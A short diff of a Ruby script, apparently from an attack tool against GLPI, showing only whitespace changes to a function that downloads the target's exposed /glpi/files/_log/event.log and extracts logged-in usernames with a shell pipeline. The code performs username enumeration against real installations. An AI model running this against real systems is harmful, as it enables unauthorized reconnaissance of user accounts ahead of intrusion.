@@ -31,14 +31,14 @@ end
 def enumerate_users(url)
 	puts "  [+]".red << " Username Enumeration".yellow
 	file = do_request(url, '/glpi/files/_log/event.log')
-	
+
 	f = File.new("username_list", "w")
 	f.puts file
 	f.close
-	
+
 	system("cat username_list | grep 'log in' | cut -d ' ' -f 3 | sort | uniq > a")
 	f = File.read("a")
-	
+
 	f.each_line {|user| print "    #{user}".yellow.bold}
 	File.delete("a")
 	File.delete("username_list")
